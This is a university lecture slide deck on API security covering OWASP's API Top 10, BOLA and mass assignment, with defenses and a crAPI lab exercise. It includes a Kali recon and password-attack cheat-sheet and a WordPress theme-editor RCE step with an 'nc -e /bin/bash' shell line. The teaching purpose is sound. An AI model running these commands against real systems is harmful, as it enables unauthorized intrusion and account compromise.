---
marp: true
theme: default
paginate: true
header: "Software Security · Week 10"
---

# Week 10
## API Security
Software Security · Nutthakorn Chalaemwongwan

---

## Today

- REST/GraphQL attack surface
- OWASP **API Security Top 10**
- BOLA & mass assignment
- Rate limiting & resource consumption
- 🎮 Game: **crAPI Raid**

---

## Recap — Web half

- Injection, XSS, auth/IDOR
- APIs concentrate all of these — and add their own

---

## Why APIs are different

- Machine-to-machine, no browser to "protect" them
- Object IDs everywhere → ripe for IDOR/BOLA
- Clients can send any field → mass assignment
- Maps to the **OWASP API Security Top 10**

---

## BOLA (API1) — the #1 API risk

```text
GET /api/vehicle/1001/location   → yours
GET /api/vehicle/1002/location   → someone else's
```

- Broken Object Level Authorization
- = IDOR, at API scale

---

## Mass assignment (API3)

```json
POST /api/user  { "name":"x", "role":"admin", "credit":9999 }
```

- Client sets fields the server blindly binds
- Privilege/credit escalation

---

## More of the Top 10

- API2 — broken authentication
- API4 — unrestricted resource consumption (no rate limit)
- API6 — unrestricted access to sensitive business flows
- Excessive data exposure (over-returning fields)

---

## Defenses

- **Object-level authorization** on every request (check ownership)
- **Allow-list** request schemas — bind only intended fields
- Rate limiting / quotas
- Return only needed fields (DTOs)
- Schema validation (OpenAPI / GraphQL types)

---

## Complementary: black-box recon cheat-sheet

When you only have an IP/URL (Kali):

```bash
netdiscover                 # find hosts
nmap -sV target             # ports/services (80/443?)
nikto -h http://target      # web server issues
dirb  http://target         # hidden paths
wpscan --url http://target  # if WordPress
hydra ... http-post-form    # password attack
```

---

## Real-world: feature abused as backdoor

WordPress 404-template RCE → reverse shell:

```text
Appearance → Theme Editor → 404 Template → insert exec(...)
# trigger by visiting any non-existent page
nc -lvp 34567 -e /bin/bash   # attacker gets a shell
```

> Legitimate admin features become RCE without strict authz + integrity checks.

---

## 🥷 Game — crAPI Raid

```bash
git clone https://github.com/OWASP/crAPI.git
cd crAPI/deploy/docker && docker compose up -d
```

1. **BOLA:** read another user's vehicle/order
2. **Mass assignment:** set a forbidden field
3. **Resource consumption:** hit an unthrottled endpoint
4. **Round 2:** add authz + schema validation + rate limiting

---

## Deliverable

- Findings mapped to the API Top 10
- Fixes (authz checks, schemas, limits)
- Proof exploits now fail

---

## Key takeaways

- BOLA/IDOR is the dominant API bug — check ownership
- Bind only fields you intend
- Validate and throttle everything

---

# Questions?
Next week: Memory-safety & exploitation
